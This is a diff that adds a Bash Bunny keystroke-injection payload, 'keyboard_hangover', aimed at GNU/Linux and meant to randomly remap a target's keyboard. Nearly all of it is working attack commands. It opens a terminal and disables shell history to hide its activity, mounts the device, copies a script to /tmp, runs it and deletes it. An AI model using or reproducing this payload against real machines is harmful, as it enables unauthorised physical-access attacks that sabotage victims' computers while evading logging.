@@ -1,0 +1,53 @@
+# Title: keyboard_hangover
+# Description: keyboard_hangover is a powerful payload which randomly remaps targets keyboard.
+# AUTHOR: drapl0n
+# Version: 1.0
+# Category: Execution.
+# Target: GNU/Linux.
+# Attackmodes: HID.
+
+LED SETUP
+ATTACKMODE STORAGE
+GET SWITCH_POSITION
+LED ATTACK
+Q DELAY 1000
+Q CTRL-ALT t
+Q DELAY 1000
+
+# [Prevent storing history]
+Q STRING unset HISTFILE
+Q ENTER
+Q DELAY 200
+
+# [Fetching BashBunny's block device]
+Q STRING disk='$(lsblk -fs | grep BashBunny | awk '\'{print\ '$1'}\'\)''
+Q ENTER
+Q DELAY 200
+
+# [Mounting BashBunny]
+Q STRING udisksctl mount -b /dev/'$disk'
+Q ENTER
+Q DELAY 2000
+Q STRING lmnt='$(lsblk | grep $disk | awk '\'{print\ '$7'}\'\)''
+Q ENTER
+Q DELAY 500
+
+# [transfering payload script]
+Q STRING cp -r '$lmnt'/payloads/library/keyboard_hangover/payload.sh /tmp/system
+Q ENTER
+Q STRING chmod +x /tmp/system
+Q ENTER
+Q STRING /tmp/./system
+Q ENTER
+Q DELAY 300
+Q STRING rm /tmp/system
+Q ENTER
+Q DELAY 500
+
+# [Unmounting BashBunny]
+Q STRING udisksctl unmount -b /dev/'$disk'
+Q ENTER
+Q DELAY 500
+#Q STRING exit
+Q ENTER
+LED FINISH
